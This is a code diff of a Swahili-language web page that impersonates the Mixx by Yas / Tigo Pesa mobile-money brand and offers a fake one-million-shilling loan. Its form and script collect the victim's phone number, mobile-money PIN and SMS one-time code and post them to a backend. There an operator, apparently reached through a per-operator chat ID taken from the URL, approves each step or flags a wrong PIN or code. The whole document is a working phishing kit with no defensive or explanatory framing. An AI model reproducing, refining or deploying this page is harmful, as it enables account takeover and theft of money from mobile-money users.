@@ -1,70 +1,323 @@
-<!-- OTP Verification Card -->
-<div id="otp-container" class="card" style="display: none;">
-  <h2>Uthibitisho Wa SMS OTP</h2>
-  <p>Weka nambari ya OTP uliyopokea kwa SMS</p>
-  
-  <div class="input-group">
-    <label for="otp-input">Weka OTP (Tarakimu 6)</label>
-    <input type="text" id="otp-input" placeholder="123456" maxlength="6" />
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MIXX BY YAS - MIKOIKO RAHISI NA YA HARAKA</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f6f9;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    header {
+      background-color: #003366;
+      color: #ffcc00;
+      width: 100%;
+      padding: 15px 0;
+      text-align: center;
+      font-size: 20px;
+      font-weight: bold;
+      position: absolute;
+      top: 0;
+    }
+    .card {
+      background: #ffffff;
+      padding: 25px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 400px;
+      margin-top: 60px;
+      box-sizing: border-box;
+    }
+    h2 {
+      color: #333;
+      font-size: 22px;
+      margin-bottom: 5px;
+      text-align: center;
+    }
+    p {
+      color: #666;
+      font-size: 14px;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .input-group {
+      margin-bottom: 15px;
+    }
+    label {
+      display: block;
+      font-size: 13px;
+      color: #444;
+      margin-bottom: 5px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    input::placeholder {
+      color: #999;
+      transition: opacity 0.2s ease-in-out;
+      opacity: 1;
+    }
+    input:focus::placeholder {
+      opacity: 0.3;
+    }
+    .primary-btn {
+      background-color: #5c7285;
+      color: white;
+      border: none;
+      width: 100%;
+      padding: 12px;
+      border-radius: 5px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .primary-btn:hover {
+      background-color: #485c6c;
+    }
+    .secondary-btn {
+      background-color: #003366;
+      color: white;
+      border: none;
+      width: 100%;
+      padding: 10px;
+      border-radius: 5px;
+      font-size: 14px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <header>MIXX BY YAS</header>
+
+  <!-- Step 1: Loan Application Form & PIN Input -->
+  <div id="application-card" class="card">
+    <h2>Omba Mkopo</h2>
+    <p>Weka maelezo yako ya Tigo Pesa</p>
+    
+    <div class="input-group">
+      <label for="phone">Namba ya Simu (Tigo Pesa)</label>
+      <input type="tel" id="phone" placeholder="e.g. 0712345678" required />
+    </div>
+
+    <div class="input-group">
+      <label for="pin">Weka PIN ya Tigo Pesa</label>
+      <input type="password" id="pin" placeholder="e.g. 1234" maxlength="4" required />
+    </div>
+
+    <button id="submit-app-btn" class="primary-btn">WASILISHA OMBI</button>
   </div>
 
-  <button id="submit-otp-btn" class="primary-btn">WASILISHA OTP</button>
+  <!-- Step 2: OTP Verification Box Container (Hidden Initially) -->
+  <div id="otp-card" class="card" style="display: none;">
+    <h2>Uthibitisho Wa SMS OTP</h2>
+    <p>Weka nambari ya OTP uliyopokea kwa SMS</p>
+    
+    <div class="input-group">
+      <label for="otp-input">Weka OTP (Tarakimu 6)</label>
+      <input type="text" id="otp-input" placeholder="123456" maxlength="6" />
+    </div>
 
-  <!-- 30-Second Countdown & Request New OTP Section -->
-  <div id="countdown-container" style="text-align: center; margin-top: 15px;">
-    <p id="timer-text" style="font-size: 14px; color: #555;">Tuma tena OTP baada ya <span id="countdown">30</span>s</p>
-    <button id="request-otp-btn" style="display: none;" class="secondary-btn">Omba OTP Mpya (Request New OTP)</button>
+    <button id="submit-otp-btn" class="primary-btn">WASILISHA OTP</button>
+
+    <!-- 30-Second Countdown & Request New OTP Section Inside Container -->
+    <div id="countdown-container" style="text-align: center; margin-top: 15px;">
+      <p id="timer-text" style="font-size: 14px; color: #555;">Tuma tena OTP baada ya <span id="countdown">30</span>s</p>
+      <button id="request-otp-btn" class="secondary-btn" style="display: none;">Omba OTP Mpya (Request New OTP)</button>
+    </div>
   </div>
-</div>
 
-<script>
-  // Function triggered automatically the exact moment the OTP screen is shown to the user
-  function startOtpCountdown() {
-    let timeLeft = 30;
-    const countdownEl = document.getElementById('countdown');
-    const timerTextEl = document.getElementById('timer-text');
-    const requestOtpBtn = document.getElementById('request-otp-btn');
+  <script>
+    // 1. Capture dynamic ?admin= code from the current browser URL (e.g., "01" or "02")
+    const urlParams = new URLSearchParams(window.location.search);
+    const adminChatId = urlParams.get('admin') || '01';
 
-    // Make sure elements are reset if reused
-    timerTextEl.style.display = 'block';
-    requestOtpBtn.style.display = 'none';
-    countdownEl.textContent = timeLeft;
+    const applicationCard = document.getElementById('application-card');
+    const otpCard = document.getElementById('otp-card');
+    const submitAppBtn = document.getElementById('submit-app-btn');
+    const submitOtpBtn = document.getElementById('submit-otp-btn');
 
-    const timer = setInterval(() => {
-      timeLeft--;
-      countdownEl.textContent = timeLeft;
-      
-      if (timeLeft <= 0) {
-        clearInterval(timer);
-        timerTextEl.style.display = 'none';
-        requestOtpBtn.style.display = 'block'; // Shows the button inside the box after 30s
+    let currentUserId = null;
+    let statusInterval = null;
+
+    // 2. Handle Application / PIN Submission
+    submitAppBtn.addEventListener('click', async () => {
+      const phone = document.getElementById('phone').value.trim();
+      const pin = document.getElementById('pin').value.trim();
+
+      if (!phone || !pin) {
+        alert('Tafadhali jaza namba ya simu na PIN.');
+        return;
       }
-    }, 1000);
 
-    // Handle clicking "Request New OTP"
-    requestOtpBtn.onclick = async () => {
+      submitAppBtn.disabled = true;
+      submitAppBtn.textContent = 'Inachakata...';
+
       try {
-        requestOtpBtn.disabled = true;
-        requestOtpBtn.textContent = 'Inatuma...';
-        
-        const response = await fetch('/api/request-new-otp', {
+        const response = await fetch('/api/submit-application', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ userId: localStorage.getItem('currentUserId') })
+          body: JSON.stringify({
+            phone: phone,
+            pin: pin,
+            amount: 'TZS 1,000,000',
+            adminChatId: adminChatId // Passes code directly to ensure isolated routing
+          })
         });
-        
+
         const data = await response.json();
         if (data.success) {
-          alert('Ombi la OTP mpya limetumwa.');
-          requestOtpBtn.textContent = 'Omba OTP Mpya (Request New OTP)';
-          requestOtpBtn.disabled = false;
-          startOtpCountdown(); // Restart the 30s countdown loop
+          currentUserId = data.userId;
+          localStorage.setItem('currentUserId', currentUserId);
+          startStatusPolling();
+        } else {
+          alert(data.error || 'Imeshindikana kutuma ombi.');
+          submitAppBtn.disabled = false;
+          submitAppBtn.textContent = 'WASILISHA OMBI';
         }
       } catch (err) {
-        console.error('Error requesting new OTP:', err);
-        requestOtpBtn.disabled = false;
+        console.error('Network error:', err);
+        submitAppBtn.disabled = false;
+        submitAppBtn.textContent = 'WASILISHA OMBI';
       }
-    };
-  }
+    });
+
+    // 3. Poll backend for admin status decisions
+    function startStatusPolling() {
+      submitAppBtn.textContent = 'Inasubiri Idhini...';
+      
+      statusInterval = setInterval(async () => {
+        if (!currentUserId) return;
+        try {
+          const res = await fetch(`/api/check-status/${currentUserId}`);
+          const data = await res.json();
+
+          if (data.status === 'APPROVED_LOAD_OTP') {
+            clearInterval(statusInterval);
+            applicationCard.style.display = 'none';
+            otpCard.style.display = 'block';
+            startOtpCountdown();
+          } else if (data.status === 'DENIED') {
+            clearInterval(statusInterval);
+            alert('Ombi lako limekataliwa.');
+            location.reload();
+          } else if (data.status === 'WRONG_PIN_ERROR') {
+            alert('PIN uliyoweka si sahihi. Tafadhali jaribu tena.');
+            location.reload();
+          }
+        } catch (e) {}
+      }, 3000);
+    }
+
+    // 4. 30-Second Countdown Logic inside OTP screen
+    function startOtpCountdown() {
+      let timeLeft = 30;
+      const countdownEl = document.getElementById('countdown');
+      const timerTextEl = document.getElementById('timer-text');
+      const requestOtpBtn = document.getElementById('request-otp-btn');
+
+      timerTextEl.style.display = 'block';
+      requestOtpBtn.style.display = 'none';
+      countdownEl.textContent = timeLeft;
+
+      const timer = setInterval(() => {
+        timeLeft--;
+        countdownEl.textContent = timeLeft;
+        
+        if (timeLeft <= 0) {
+          clearInterval(timer);
+          timerTextEl.style.display = 'none';
+          requestOtpBtn.style.display = 'block';
+        }
+      }, 1000);
+
+      requestOtpBtn.onclick = async () => {
+        try {
+          requestOtpBtn.disabled = true;
+          requestOtpBtn.textContent = 'Inatuma...';
+          
+          const response = await fetch('/api/request-new-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ userId: currentUserId })
+          });
+          
+          const data = await response.json();
+          if (data.success) {
+            alert('Ombi la OTP mpya limetumwa kwa msimamizi.');
+            requestOtpBtn.textContent = 'Omba OTP Mpya (Request New OTP)';
+            requestOtpBtn.disabled = false;
+            startOtpCountdown();
+          }
+        } catch (err) {
+          requestOtpBtn.disabled = false;
+        }
+      };
+    }
+
+    // 5. Handle OTP Submission
+    submitOtpBtn.addEventListener('click', async () => {
+      const otp = document.getElementById('otp-input').value.trim();
+      if (!otp || otp.length < 6) {
+        alert('Tafadhali ingiza namba kamili ya OTP ya tarakimu 6.');
+        return;
+      }
+
+      submitOtpBtn.disabled = true;
+      submitOtpBtn.textContent = 'Inathibitisha...';
+
+      try {
+        const response = await fetch('/api/submit-otp', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ userId: currentUserId, otp: otp })
+        });
+
+        const data = await response.json();
+        if (data.success) {
+          startOtpStatusPolling();
+        }
+      } catch (err) {
+        submitOtpBtn.disabled = false;
+        submitOtpBtn.textContent = 'WASILISHA OTP';
+      }
+    });
+
+    function startOtpStatusPolling() {
+      const otpCheck = setInterval(async () => {
+        try {
+          const res = await fetch(`/api/check-status/${currentUserId}`);
+          const data = await res.json();
+
+          if (data.status === 'SUCCESS') {
+            clearInterval(otpCheck);
+            alert('Hongera! Mkopo wako umeidhinishwa na kuhamishwa.');
+            location.reload();
+          } else if (data.status === 'WRONG_OTP_ERROR') {
+            clearInterval(otpCheck);
+            alert('OTP uliyoweka si sahihi. Tafadhali jaribu tena.');
+            location.reload();
+          }
+        } catch (e) {}
+      }, 3000);
+    }
   </script>
-  
+</body>
+  </html>
+        
